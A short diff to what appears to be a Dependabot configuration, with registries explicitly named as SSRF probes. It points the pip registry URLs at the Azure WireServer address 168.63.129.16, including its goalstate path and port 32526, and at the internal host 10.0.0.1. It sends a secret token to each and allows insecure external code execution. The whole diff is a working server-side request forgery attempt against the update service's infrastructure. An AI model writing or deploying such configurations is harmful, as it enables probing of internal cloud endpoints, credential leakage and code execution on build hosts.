@@ -1,8 +1,12 @@
 version: 2
 registries:
-  ssrf-probe:
+  ssrf-32526:
     type: python-index
-    url: http://168.63.129.16/machine/?comp=goalstate&x-ms-version=2020-06-01#
+    url: http://168.63.129.16:32526/#
+    token: ${{ secrets.SSRF_TOKEN }}
+  ssrf-internal:
+    type: python-index
+    url: http://10.0.0.1/#
     token: ${{ secrets.SSRF_TOKEN }}
 updates:
   - package-ecosystem: "pip"
@@ -11,4 +15,5 @@ updates:
       interval: "daily"
     insecure-external-code-execution: allow
     registries:
-      - ssrf-probe
+      - ssrf-32526
+      - ssrf-internal
